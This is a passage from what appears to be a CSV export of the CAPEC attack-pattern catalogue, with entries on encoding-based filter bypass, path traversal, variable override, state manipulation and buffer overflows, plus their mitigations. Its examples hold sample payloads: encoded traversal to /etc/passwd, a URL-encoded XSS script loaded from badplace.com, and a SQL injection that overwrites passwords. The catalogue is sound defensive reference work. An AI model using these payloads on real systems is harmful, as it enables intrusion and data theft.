or cause the classifying mechanism to fail to properly understanding the request. That may allow the attacker to slip malicious data past the content filter and/or possibly cause the application to route the request incorrectly.\",\"\",Medium,High,\"::NATURE:ChildOf:CAPEC ID:267::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Survey the application for user-controllable inputs] Using a browser or an automated tool, an attacker follows all public links and actions on a web site. They record all the links, the forms, the resources accessed and all other potential entry-points for the web application.:TECHNIQUE:Use a spidering tool to follow and record all links and analyze the web pages to find entry points. Make special note of any links that include parameters in the URL.:TECHNIQUE:Use a proxy tool to record all user input entry points visited during a manual traversal of the web application.:TECHNIQUE:Use a browser to manually explore the website and analyze how it is constructed. Many browsers' plugins are available to facilitate the analysis or automate the discovery.::STEP:2:PHASE:Experiment:DESCRIPTION:[Probe entry points to locate vulnerabilities] The attacker uses the entry points gathered in the Explore phase as a target list and injects various Unicode encoded payloads to determine if an entry point actually represents a vulnerability with insufficient validation logic and to characterize the extent to which the vulnerability can be exploited.:TECHNIQUE:Try to use Unicode encoding of content in Scripts in order to bypass validation routines.:TECHNIQUE:Try to use Unicode encoding of content in HTML in order to bypass validation routines.:TECHNIQUE:Try to use Unicode encoding of content in CSS in order to bypass validation routines.::\",\"::Filtering is performed on data that has not be properly canonicalized.::\",\"::SKILL:An attacker needs to understand Unicode encodings and have an idea (or be able to find out) what system components may not be Unicode aware.:LEVEL:Medium::\",\"\",\"::Unicode encoded data is passed to APIs where it is not expected::\",\"::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Bypass Protection Mechanism::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:Availability:TECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Run Arbitrary Code::SCOPE:Integrity:TECHNICAL IMPACT:Modify Data::SCOPE:Availability:TECHNICAL IMPACT:Unreliable Execution::\",\"::Ensure that the system is Unicode aware and can properly process Unicode data. Do not make an assumption that data will be in ASCII.::Ensure that filtering or input validation is applied to canonical data.::Assume all input is malicious. Create an allowlist that defines all valid input to the software system based on the requirements specifications. Input that does not match against the allowlist should not be permitted to enter into the system.::\",\"::A very common technique for a Unicode attack involves traversing directories looking for interesting files. An example of this idea applied to the Web is http://target.server/some_directory/../../../winnt In this case, the attacker is attempting to traverse to a directory that is not supposed to be part of standard Web services. The trick is fairly obvious, so many Web servers and scripts prevent it. However, using alternate encoding tricks, an attacker may be able to get around badly implemented request filters. In October 2000, an adversary publicly revealed that Microsoft's IIS server suffered from a variation of this problem. In the case of IIS, all the attacker had to do was provide alternate encodings for the dots and/or slashes found in a classic attack. The Unicode translations are . yields C0 AE/ yields C0 AF yields C1 9C Using this conversion, the previously displayed URL can be encoded as http://target.server/some_directory/%C0AE/%C0AE/%C0AE%C0AE/%C0AE%C0AE/winntSee also: CVE-2000-0884::\",\"::176::179::180::173::172::184::183::74::20::697::692::\",\"TAXONOMY NAME:OWASP Attacks:ENTRY NAME:Unicode Encoding::\",\"\",\n72,\"URL Encoding\",Detailed,Draft,\"This attack targets the encoding of the URL. An adversary can take advantage of the multiple way of encoding an URL and abuse the interpretation of the URL.\",\"\",High,High,\"::NATURE:ChildOf:CAPEC ID:267::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Survey web application for URLs with parameters] Using a browser, an automated tool or by inspecting the application, an adversary records all URLs that contain parameters.:TECHNIQUE:Use a spidering tool to follow and record all links and analyze the web pages to find entry points. Make special note of any links that include parameters in the URL.::STEP:2:PHASE:Experiment:DESCRIPTION:[Probe URLs to locate vulnerabilities] The adversary uses the URLs gathered in the Explore phase as a target list and tests parameters with different encodings of special characters to see how the web application will handle them.:TECHNIQUE:Use URL encodings of special characters such as semi-colons, backslashes, or question marks that might be filtered out normally.:TECHNIQUE:Combine the use of URL encodings with other encoding techniques such as the triple dot and escape slashes.::STEP:3:PHASE:Exploit:DESCRIPTION:[Inject special characters into URL parameters] Using the information gathered in the Experiment phase, the adversary injects special characters into the URL using URL encoding. This can lead to path traversal, cross-site scripting, SQL injection, etc.::\",\"::The application should accepts and decodes URL input.::The application performs insufficient filtering/canonicalization on the URLs.::\",\"::SKILL:An adversary can try special characters in the URL and bypass the URL validation.:LEVEL:Low::SKILL:The adversary may write a script to defeat the input filtering mechanism.:LEVEL:Medium::\",\"\",\"::If the first decoding process has left some invalid or denylisted characters, that may be a sign that the request is malicious.::Traffic filtering with IDS (or proxy) can detect requests with suspicious URLs. IDS may use signature based identification to reveal such URL based attacks.::\",\"::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::SCOPE:Availability:TECHNICAL IMPACT:Resource Consumption:NOTE:Denial of Service::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:Availability:TECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Run Arbitrary Code::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Gain Privileges::\",\"::Refer to the RFCs to safely decode URL.::Regular expression can be used to match safe URL patterns. However, that may discard valid URL requests if the regular expression is too restrictive.::There are tools to scan HTTP requests to the server for valid URL such as URLScan from Microsoft (http://www.microsoft.com/technet/security/tools/urlscan.mspx).::Any security checks should occur after the data has been decoded and validated as correct data format. Do not repeat decoding process, if bad character are left after decoding process, treat the data as suspicious, and fail the validation process.::Assume all input is malicious. Create an allowlist that defines all valid input to the software system based on the requirements specifications. Input that does not match against the allowlist should not be permitted to enter into the system. Test your decoding process against malicious input.::Be aware of the threat of alternative method of data encoding and obfuscation technique such as IP address encoding. (See related guideline section)::When client input is required from web-based forms, avoid using the GET method to submit data, as the method causes the form data to be appended to the URL and is easily manipulated. Instead, use the POST method whenever possible.::\",\"::URL Encodings in IceCast MP3 Server. The following type of encoded string has been known traverse directories against the IceCast MP3 server9: http://[targethost]:8000/somefile/%2E%2E/target.mp3 or using /%25%25/ instead of /../. The control character .. can be used by an adversary to escape the document root.See also: CVE-2001-0784::Cross-Site Scripting URL-Encoded attack:http://target/getdata.php?data=%3cscript%20src=%22http%3a%2f%2fwww.badplace.com%2fnasty.js%22%3e%3c%2fscript%3e HTML execution:<script src=http://www.badplace.com/nasty.js></script> [REF-495]::SQL Injection Original database query in the example file - login.asp:SQLQuery = SELECT preferences FROM logintable WHERE userid=' & Request.QueryString(userid) & ' AND password=' & Request.QueryString(password) & '; URL-encoded attack:http://target/login.asp?userid=bob%27%3b%20update%20logintable%20set%20passwd%3d%270wn3d%27%3b--%00 Executed database query:SELECT preferences FROM logintable WHERE userid='bob'; update logintable set password='0wn3d'; From URL encoded attacks, by Gunter Ollmann - http://www.cgisecurity.com/lib/URLEmbeddedAttacks.html::Combined Encodings CesarFTP Alexandre Cesari released a freeware FTP server for Windows that fails to provide proper filtering against multiple encoding. The FTP server, CesarFTP, included a Web server component that could be attacked with a combination of the triple-dot and URL encoding attacks. An adversary could provide a URL that included a string like /...%5C/ This is an interesting exploit because it involves an aggregation of several tricks: the escape character, URL encoding, and the triple dot.See also: CVE-2001-1335::\",\"::173::177::172::73::74::20::\",\"\",\"\",\n73,\"User-Controlled Filename\",Standard,Draft,\"An attack of this type involves an adversary inserting malicious characters (such as a XSS redirection) into a filename, directly or indirectly that is then used by the target software to generate HTML text or other potentially executable content. Many websites rely on user-generated content and dynamically build resources like files, filenames, and URL links directly from user supplied data. In this attack pattern, the attacker uploads code that can execute in the client browser and/or redirect the client browser to a site that the attacker owns. All XSS attack payload variants can be used to pass and exploit these vulnerabilities.\",\"\",High,High,\"::NATURE:ChildOf:CAPEC ID:165::NATURE:CanPrecede:CAPEC ID:592::\",\"\",\"::The victim must trust the name and locale of user controlled filenames.::\",\"::SKILL:To achieve a redirection and use of less trusted source, an attacker can simply edit data that the host uses to build the filename:LEVEL:Low::SKILL:Deploying a malicious look-a-like site (such as a site masquerading as a bank or online auction site) that the user enters their authentication data into.:LEVEL:Medium::SKILL:Exploiting a client side vulnerability to inject malicious scripts into the browser's executable process.:LEVEL:High::\",\"\",\"\",\"::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Gain Privileges::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:Availability:TECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Run Arbitrary Code::SCOPE:Availability:TECHNICAL IMPACT:Alter Execution Logic::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::\",\"::Design: Use browser technologies that do not allow client side scripting.::Implementation: Ensure all content that is delivered to client is sanitized against an acceptable content specification.::Implementation: Perform input validation for all remote content.::Implementation: Perform output validation for all remote content.::Implementation: Disable scripting languages such as JavaScript in browser::Implementation: Scan dynamically generated content against validation specification::\",\"::Phishing attacks rely on a user clicking on links on that are supplied to them by attackers masquerading as a trusted resource such as a bank or online auction site. The end user's email client hosts the supplied resource name in this case via email. The resource name, however may either 1) direct the client browser to a malicious site to steal credentials and/or 2) execute code on the client machine to probe the victim's host system and network environment.::\",\"::20::184::96::348::116::350::86::697::\",\"\",\"\",\n74,\"Manipulating State\",Meta,Stable,\"The adversary modifies state information maintained by the target software or causes a state transition in hardware. If successful, the target will use this tainted state and execute in an unintended manner. State management is an important function within a software application. User state maintained by the application can include usernames, payment information, browsing history as well as application-specific contents such as items in a shopping cart. Manipulating user state can be employed by an adversary to elevate privilege, conduct fraudulent transactions or otherwise modify the flow of the application to derive certain benefits. If there is a hardware logic error in a finite state machine, the adversary can use this to put the system in an undefined state which could cause a denial of service or exposure of secure data.\",\"\",Medium,High,\"\",\"::STEP:1:PHASE:Explore:DESCRIPTION:Adversary determines the nature of state management employed by the target. This includes determining the location (client-side, server-side or both applications) and possibly the items stored as part of user state.::STEP:2:PHASE:Experiment:DESCRIPTION:The adversary now tries to modify the user state contents (possibly indiscriminately if the contents are encrypted or otherwise obfuscated) or cause a state transition and observe the effects of this change on the target.::STEP:3:PHASE:Exploit:DESCRIPTION:Having determined how to manipulate the state, the adversary can perform illegitimate actions.::\",\"::User state is maintained at least in some way in user-controllable locations, such as cookies or URL parameters.::There is a faulty finite state machine in the hardware logic that can be exploited.::\",\"::SKILL:The adversary needs to have knowledge of state management as employed by the target application, and also the ability to manipulate the state in a meaningful way.:LEVEL:Medium::\",\"::The adversary needs a data tampering tool capable of generating and creating custom inputs to aid in the attack, like Fiddler, Wireshark, or a similar in-browser plugin (e.g., Tamper Data for Firefox).::\",\"\",\"::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Gain Privileges::SCOPE:Integrity:TECHNICAL IMPACT:Modify Data::SCOPE:Availability:TECHNICAL IMPACT:Unreliable Execution::\",\"::Do not rely solely on user-controllable locations, such as cookies or URL parameters, to maintain user state.::Avoid sensitive information, such as usernames or authentication and authorization information, in user-controllable locations.::Sensitive information that is part of the user state must be appropriately protected to ensure confidentiality and integrity at each request.::All possible states must be handled by hardware finite state machines.::\",\"::During the authentication process, an application stores the authentication decision (auth=0/1) in unencrypted cookies. At every request, this cookie is checked to permit or deny a request. An adversary can easily violate this representation of user state and set auth=1 at every request in order to gain illegitimate access and elevated privilege in the application.::\",\"::372::315::353::693::1245::1253::1265::1271::\",\"\",\"\","
  },
  "doc-c8b80e0bc4a47767fa556d13e3975ad6": {
    "content": "'ID,Name,Abstraction,Status,Description,Alternate Terms,Likelihood Of Attack,Typical Severity,Related Attack Patterns,Execution Flow,Prerequisites,Skills Required,Resources Required,Indicators,Consequences,Mitigations,Example Instances,Related Weaknesses,Taxonomy Mappings,Notes\n75,\"Manipulating Writeable Configuration Files\",Standard,Draft,\"Generally these are manually edited files that are not in the preview of the system administrators, any ability on the attackers' behalf to modify these files, for example in a CVS repository, gives unauthorized access directly to the application, the same as authorized users.\",\"\",High,Very High,\"::NATURE:ChildOf:CAPEC ID:176::\",\"\",\"::Configuration files must be modifiable by the attacker::\",\"::SKILL:To identify vulnerable configuration files, and understand how to manipulate servers and erase forensic evidence:LEVEL:Medium::\",\"\",\"\",\"::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Gain Privileges::\",\"::Design: Enforce principle of least privilege::Design: Backup copies of all configuration files::Implementation: Integrity monitoring for configuration files::Implementation: Enforce audit logging on code and configuration promotion procedures.::Implementation: Load configuration from separate process and memory space, for example a separate physical device like a CD::\",\"::The BEA Weblogic server uses a config.xml file to store configuration data. If this file is not properly protected by the system access control, an attacker can write configuration information to redirect server output through system logs, database connections, malicious URLs and so on. Access to the Weblogic server may be from a so-called Custom realm which manages authentication and authorization privileges on behalf of user principals. Given write access, the attacker can insert a pointer to a custom realm jar file in the config.xml < CustomRealmConfigurationData=java.util.PropertiesName=CustomRealmRealmClassName=Maliciousrealm.jar/> The main issue with configuration files is that the attacker can leverage all the same functionality the server has, but for malicious means. Given the complexity of server configuration, these changes may be very hard for administrators to detect.::\",\"::349::99::77::346::353::354::\",\"\",\"\",\n76,\"Manipulating Web Input to File System Calls\",Detailed,Draft,\"An attacker manipulates inputs to the target software which the target software passes to file system calls in the OS. The goal is to gain access to, and perhaps modify, areas of the file system that the target software did not intend to be accessible.\",\"\",High,Very High,\"::NATURE:ChildOf:CAPEC ID:126::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Fingerprinting of the operating system] In order to create a valid file injection, the attacker needs to know what the underlying OS is so that the proper file seperator is used.:TECHNIQUE:Port mapping. Identify ports that the system is listening on, and attempt to identify inputs and protocol types on those ports.:TECHNIQUE:TCP/IP Fingerprinting. The attacker uses various software to make connections or partial connections and observe idiosyncratic responses from the operating system. Using those responses, they attempt to guess the actual operating system.:TECHNIQUE:Induce errors to find informative error messages::STEP:2:PHASE:Explore:DESCRIPTION:[Survey the Application to Identify User-controllable Inputs] The attacker surveys the target application to identify all user-controllable inputs, possibly as a valid and authenticated user:TECHNIQUE:Spider web sites for all available links, entry points to the web site.:TECHNIQUE:Manually explore application and inventory all application inputs::STEP:3:PHASE:Experiment:DESCRIPTION:[Vary inputs, looking for malicious results] Depending on whether the application being exploited is a remote or local one, the attacker crafts the appropriate malicious input containing the path of the targeted file or other file system control syntax to be passed to the application:TECHNIQUE:Inject context-appropriate malicious file path using network packet injection tools (netcat, nemesis, etc.):TECHNIQUE:Inject context-appropriate malicious file path using web test frameworks (proxies, TamperData, custom programs, etc.) or simple HTTP requests:TECHNIQUE:Inject context-appropriate malicious file system control syntax::STEP:4:PHASE:Exploit:DESCRIPTION:[Manipulate files accessible by the application] The attacker may steal information or directly manipulate files (delete, copy, flush, etc.):TECHNIQUE:The attacker injects context-appropriate malicious file path to access the content of the targeted file.:TECHNIQUE:The attacker injects context-appropriate malicious file system control syntax to access the content of the targeted file.:TECHNIQUE:The attacker injects context-appropriate malicious file path to cause the application to create, delete a targeted file.:TECHNIQUE:The attacker injects context-appropriate malicious file system control syntax to cause the application to create, delete a targeted file.:TECHNIQUE:The attacker injects context-appropriate malicious file path in order to manipulate the meta-data of the targeted file.:TECHNIQUE:The attacker injects context-appropriate malicious file system control syntax in order to manipulate the meta-data of the targeted file.::\",\"::Program must allow for user controlled variables to be applied directly to the filesystem::\",\"::SKILL:To identify file system entry point and execute against an over-privileged system interface:LEVEL:Low::\",\"\",\"\",\"::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Gain Privileges::SCOPE:Integrity:TECHNICAL IMPACT:Modify Data::\",\"::Design: Enforce principle of least privilege.::Design: Ensure all input is validated, and does not contain file system commands::Design: Run server interfaces with a non-root account and/or utilize chroot jails or other configuration techniques to constrain privileges even if attacker gains some limited access to commands.::Design: For interactive user applications, consider if direct file system interface is necessary, instead consider having the application proxy communication.::Implementation: Perform testing such as pen-testing and vulnerability scanning to identify directories, programs, and interfaces that grant direct access to executables.::\",\"::The attacker uses relative path traversal to access files in the application. This is an example of accessing user's password file. http://www.example.com/getProfile.jsp?filename=../../../../etc/passwd However, the target application employs regular expressions to make sure no relative path sequences are being passed through the application to the web page. The application would replace all matches from this regex with the empty string. Then an attacker creates special payloads to bypass this filter: http://www.example.com/getProfile.jsp?filename=%2e%2e/%2e%2e/%2e%2e/%2e%2e /etc/passwd When the application gets this input string, it will be the desired vector by the attacker.::\",\"::23::22::73::77::346::348::285::272::59::74::15::\",\"\",\"\",\n77,\"Manipulating User-Controlled Variables\",Standard,Draft,\"This attack targets user controlled variables (DEBUG=1, PHP Globals, and So Forth). An adversary can override variables leveraging user-supplied, untrusted query variables directly used on the application server without any data sanitization. In extreme cases, the adversary can change variables controlling the business logic of the application. For instance, in languages like PHP, a number of poorly set default configurations may allow the user to override variables.\",\"\",High,Very High,\"::NATURE:ChildOf:CAPEC ID:22::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Probe target application] The adversary first probes the target application to determine important information about the target. This information could include types software used, software versions, what user input the application consumes, and so on.::STEP:2:PHASE:Experiment:DESCRIPTION:[Find user-controlled variables] Using the information found by probing the application, the adversary attempts to manipulate many user-controlled variables and observes the effects on the application. If the adversary notices any significant changes to the application, they will know that a certain variable is useful to the application.:TECHNIQUE:Adversaries will try to alter many common variable names such as count, tempFile, i, etc. The hope is that they can alter the flow of the application without knowing the inner-workings.:TECHNIQUE:Adversaries will try to alter known environment variables.::STEP:3:PHASE:Exploit:DESCRIPTION:[Manipulate user-controlled variables] Once the adversary has found a user-controller variable(s) that is important to the application, they will manipulate it to change the normal behavior in a way that benefits the adversary.::\",\"::A variable consumed by the application server is exposed to the client.::A variable consumed by the application server can be overwritten by the user.::The application server trusts user supplied data to compute business logic.::The application server does not perform proper input validation.::\",\"::SKILL:The malicious user can easily try some well-known global variables and find one which matches.:LEVEL:Low::SKILL:The adversary can use automated tools to probe for variables that they can control.:LEVEL:Medium::\",\"\",\"::A web penetration tool probing a web server may generate abnormal activities recorded on log files. Abnormal traffic such as a high number of request coming from the same client may also rise the warnings from a monitoring system or an intrusion detection tool.::\",\"::SCOPE:Integrity:TECHNICAL IMPACT:Modify Data::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:Availability:TECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Run Arbitrary Code::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Gain Privileges::\",\"::Do not allow override of global variables and do Not Trust Global Variables. If the register_globals option is enabled, PHP will create global variables for each GET, POST, and cookie variable included in the HTTP request. This means that a malicious user may be able to set variables unexpectedly. For instance make sure that the server setting for PHP does not expose global variables.::A software system should be reluctant to trust variables that have been initialized outside of its trust boundary. Ensure adequate checking is performed when relying on input from outside a trust boundary.::Separate the presentation layer and the business logic layer. Variables at the business logic layer should not be exposed at the presentation layer. This is to prevent computation of business logic from user controlled input data.::Use encapsulation when declaring your variables. This is to lower the exposure of your variables.::Assume all input is malicious. Create an allowlist that defines all valid input to the software system based on the requirements specifications. Input that does not match against the allowlist should be rejected by the program.::\",\"::PHP is a study in bad security. The main idea pervading PHP is ease of use, and the mantra don't make the developer go to any extra work to get stuff done applies in all cases. This is accomplished in PHP by removing formalism from the language, allowing declaration of variables on first use, initializing everything with preset values, and taking every meaningful variable from a transaction and making it available. In cases of collision with something more technical, the simple almost always dominates in PHP. One consequence of all this is that PHP allows users of a Web application to override environment variables with user-supplied, untrusted query variables. Thus, critical values such as the CWD and the search path can be overwritten and directly controlled by a remote anonymous user. Another similar consequence is that variables can be directly controlled and assigned from the user-controlled values supplied in GET and POST request fields. So seemingly normal code like this, does bizarre things: while($count < 10){// Do something$count++;} Normally, this loop will execute its body ten times. The first iteration will be an undefined zero, and further trips though the loop will result in an increment of the variable $count. The problem is that the coder does not initialize the variable to zero before entering the loop. This is fine because PHP initializes the variable on declaration. The result is code that seems to function, regardless of badness. The problem is that a user of the Web application can supply a request such as GET /login.php?count=9 and cause $count to start out at the value 9, resulting in only one trip through the loop. Yerg. Depending on the configuration, PHP may accept user-supplied variables in place of environment variables. PHP initializes global variables for all process environment variables, such as $PATH and $HOSTNAME. These variables are of critical importance because they may be used in file or network operations. If an adversary can supply a new $PATH variable (such as PATH='/var'), the program may be exploitable. PHP may also take field tags supplied in GET/POST requests and transform them into global variables. This is the case with the $count variable we explored in our previous example. Consider another example of this problem in which a program defines a variable called $tempfile. An adversary can supply a new temp file such as $tempfile = /etc/passwd. Then the temp file may get erased later via a call to unlink($tempfile);. Now the passwd file has been erased--a bad thing indeed on most OSs. Also consider that the use of include() and require() first search $PATH, and that using calls to the shell may execute crucial programs such as ls. In this way, ls may be Trojaned (the adversary can modify $PATH to cause a Trojan copy of ls to be loaded). This type of attack could also apply to loadable libraries if $LD_LIBRARY_PATH is modified. Finally, some versions of PHP may pass user data to syslog as a format string, thus exposing the application to a format string buffer overflow.See also: File upload allows arbitrary file read by setting hidden form variables to match internal variable names (CVE-2000-0860)::\",\"::15::94::96::285::302::473::1321::\",\"\",\"\",\n78,\"Using Escaped Slashes in Alternate Encoding\",Detailed,Draft,\"This attack targets the use of the backslash in alternate encoding. An adversary can provide a backslash as a leading character and causes a parser to believe that the next character is special. This is called an escape. By using that trick, the adversary tries to exploit alternate ways to encode the same character which leads to filter problems and opens avenues to attack.\",\"\",High,High,\"::NATURE:ChildOf:CAPEC ID:267::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Survey the application for user-controllable inputs] Using a browser, an automated tool or by inspecting the application, an adversary records all entry points to the application.:TECHNIQUE:Use a spidering tool to follow and record all links and analyze the web pages to find entry points. Make special note of any links that include parameters in the URL.:TECHNIQUE:Use a proxy tool to record all user input entry points visited during a manual traversal of the web application.:TECHNIQUE:Use a browser to manually explore the website and analyze how it is constructed. Many browsers' plugins are available to facilitate the analysis or automate the discovery.:TECHNIQUE:Manually inspect the application to find entry points.::STEP:2:PHASE:Experiment:DESCRIPTION:[Probe entry points to locate vulnerabilities] The adversary uses the entry points gathered in the Explore phase as a target list and attempts to escape multiple different special characters using a backslash.:TECHNIQUE:Escape a special character with a backslash to bypass input validation.:TECHNIQUE:Try different encodings of both the backslash and the special character to see if this bypasses input validation::STEP:3:PHASE:Exploit:DESCRIPTION:[Manipulate input] Once the adversary determines how to bypass filters that filter out special characters using an escaped slash, they will manipulate the user input in a way that is not intended by the application.::\",\"::The application accepts the backlash character as escape character.::The application server does incomplete input data decoding, filtering and validation.::\",\"::SKILL:The adversary can naively try backslash character and discover that the target host uses it as escape character.:LEVEL:Low::SKILL:The adversary may need deep understanding of the host target in order to exploit the vulnerability. The adversary may also use automated tools to probe for this vulnerability.:LEVEL:Medium::\",\"\",\"::An adversary can use a fuzzer in order to probe for this vulnerability. The fuzzer should generate suspicious network activity noticeable by an intrusion detection system.::\",\"::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::SCOPE:Availability:TECHNICAL IMPACT:Resource Consumption:NOTE:Denial of Service::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:Availability:TECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Run Arbitrary Code::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Bypass Protection Mechanism::\",\"::Verify that the user-supplied data does not use backslash character to escape malicious characters.::Assume all input is malicious. Create an allowlist that defines all valid input to the software system based on the requirements specifications. Input that does not match against the allowlist should not be permitted to enter into the system.::Be aware of the threat of alternative method of data encoding.::Regular expressions can be used to filter out backslash. Make sure you decode before filtering and validating the untrusted input data.::In the case of path traversals, use the principle of least privilege when determining access rights to file systems. Do not allow users to access directories/files that they should not access.::Any security checks should occur after the data has been decoded and validated as correct data format. Do not repeat decoding process, if bad character are left after decoding process, treat the data as suspicious, and fail the validation process.::Avoid making decisions based on names of resources (e.g. files) if those resources can have alternate names.::\",\"::For example, the byte pair 0 might result in a single zero byte (a NULL) being sent. Another example is t, which is sometimes converted into a tab character. There is often an equivalent encoding between the back slash and the escaped back slash. This means that / results in a single forward slash. A single forward slash also results in a single forward slash. The encoding looks like this: / yields // yields /::An attack leveraging escaped slashes in slternate encodings is very simple. If you believe the target may be filtering the slash, attempt to supply / and see what happens. Example command strings to try out include CWD ../../../../winnt which converts in many cases to CWD ../../../../winnt To probe for this kind of problem, a small C program that uses string output routines can be very useful. File system calls make excellent testing fodder. The simple snippet int main(int argc, char* argv[]){puts(/ ? . | );return 0; } produces the output / ? . | Clearly, the back slash is ignored, and thus we have hit on a number of alternative encodings to experiment with. Given our previous example, we can extend the attack to include other possibilities: CWD ..????/../../../winntCWD ../../../../winntCWD ..||||/../../../winnt::\",\"::180::181::173::172::73::22::74::20::697::707::\",\"\",\"\",\n79,\"Using Slashes in Alternate Encoding\",Detailed,Draft,\"This attack targets the encoding of the Slash characters. An adversary would try to exploit common filtering problems related to the use of the slashes characters to gain access to resources on the target host. Directory-driven systems, such as file systems and databases, typically use the slash character to indicate traversal between directories or other container components. For murky historical reasons, PCs (and, as a result, Microsoft OSs) choose to use a backslash, whereas the UNIX world typically makes use of the forward slash. The schizophrenic result is that many MS-based systems are required to understand both forms of the slash. This gives the adversary many opportunities to discover and abuse a number of common filtering problems. The goal of this pattern is to discover server software that only applies filters to one version, but not the other.\",\"\",High,High,\"::NATURE:ChildOf:CAPEC ID:267::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Survey the application for user-controllable inputs] Using a browser, an automated tool or by inspecting the application, an adversary records all entry points to the application.:TECHNIQUE:Use a spidering tool to follow and record all links and analyze the web pages to find entry points. Make special note of any links that include parameters in the URL.:TECHNIQUE:Use a proxy tool to record all user input entry points visited during a manual traversal of the web application.:TECHNIQUE:Use a browser to manually explore the website and analyze how it is constructed. Many browsers' plugins are available to facilitate the analysis or automate the discovery.:TECHNIQUE:Manually inspect the application to find entry points.::STEP:2:PHASE:Experiment:DESCRIPTION:[Probe entry points to locate vulnerabilities] The adversary uses the entry points gathered in the Explore phase as a target list and looks for areas where user input is used to access resources on the target host. The adversary attempts different encodings of slash characters to bypass input filters.:TECHNIQUE:Try both backslash and forward slash characters:TECHNIQUE:Try different encodings for slash characters such as %5C::STEP:3:PHASE:Exploit:DESCRIPTION:[Traverse application directories] Once the adversary determines how to bypass filters that filter out slash characters, they will manipulate the user input to include slashes in order to traverse directories and access resources that are not intended for the user.::\",\"::The application server accepts paths to locate resources.::The application server does insufficient input data validation on the resource path requested by the user.::The access right to resources are not set properly.::\",\"::SKILL:An adversary can try variation of the slashes characters.:LEVEL:Low::SKILL:An adversary can use more sophisticated tool or script to scan a website and find a path filtering problem.:LEVEL:Medium::\",\"\",\"::If the first path decoding process has left some invalid or denylisted characters, that may be a sign that the request is malicious.::Traffic filtering with IDS (or proxy) can detect request with suspicious URLs. IDS may use signature based identification to reveal such URL based attacks.::An adversary can use a fuzzer in order to probe for a UTF-8 encoding vulnerability. The fuzzer should generate suspicious network activity.::\",\"::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:Availability:TECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Run Arbitrary Code::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Gain Privileges::\",\"::Any security checks should occur after the data has been decoded and validated as correct data format. Do not repeat decoding process, if bad character are left after decoding process, treat the data as suspicious, and fail the validation process. Refer to the RFCs to safely decode URL.::When client input is required from web-based forms, avoid using the GET method to submit data, as the method causes the form data to be appended to the URL and is easily manipulated. Instead, use the POST method whenever possible.::There are tools to scan HTTP requests to the server for valid URL such as URLScan from Microsoft (http://www.microsoft.com/technet/security/tools/urlscan.mspx)::Be aware of the threat of alternative method of data encoding and obfuscation technique such as IP address encoding. (See related guideline section)::Test your path decoding process against malicious input.::In the case of path traversals, use the principle of least privilege when determining access rights to file systems. Do not allow users to access directories/files that they should not access.::Assume all input is malicious. Create an allowlist that defines all valid input to the application based on the requirements specifications. Input that does not match against the allowlist should not be permitted to enter into the system.::\",\"::Attack Example: Slashes in Alternate Encodings The two following requests are equivalent on most Web servers: http://target server/some_directory......winnt is equivalent to http://target server/some_directory/../../../winnt Multiple encoding conversion problems can also be leveraged as various slashes are instantiated in URL-encoded, UTF-8, or Unicode. Consider the strings http://target server/some_directory..%5C..%5C..winnt where %5C is equivalent to the character.::\",\"::173::180::181::20::74::73::22::185::200::697::707::\",\"\",\"\",\n8,\"Buffer Overflow in an API Call\",Detailed,Draft,\"This attack targets libraries or shared code modules which are vulnerable to buffer overflow attacks. An adversary who has knowledge of known vulnerable libraries or shared code can easily target software that makes use of these libraries. All clients that make use of the code library thus become vulnerable by association. This has a very broad effect on security across a system, usually affecting more than one software process.\",\"\",High,High,\"::NATURE:ChildOf:CAPEC ID:100::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Identify target application] The adversary, with knowledge of vulnerable libraries or shared code modules, identifies a target application or program that makes use of these.::STEP:2:PHASE:Experiment:DESCRIPTION:[Find injection vector] The adversary attempts to use the API, and if they can they send a large amount of data to see if the buffer overflow attack really does work.:TECHNIQUE:Provide large input to a program or application and observe the behavior. If there is a crash, this means that a buffer overflow attack is possible.::STEP:3:PHASE:Experiment:DESCRIPTION:[Craft overflow content] The adversary crafts the content to be injected based on their knowledge of the vulnerability and their desired outcome. If the intent is to simply cause the software to crash, the content need only consist of an excessive quantity of random data. If the intent is to leverage the overflow for execution of arbitrary code, the adversary will craft a set of content that not only overflows the targeted buffer but does so in such a way that the overwritten return address is replaced with one of the adversaries' choosing which points to code injected by the adversary.:TECHNIQUE:Create malicious shellcode that will execute when the program execution is returned to it.:TECHNIQUE:Use a NOP-sled in the overflow content to more easily slide into the malicious code. This is done so that the exact return address need not be correct, only in the range of all of the NOPs::STEP:4:PHASE:Exploit:DESCRIPTION:[Overflow the buffer] Using the API as the injection vector, the adversary injects the crafted overflow content into the buffer.::\",\"::The target host exposes an API to the 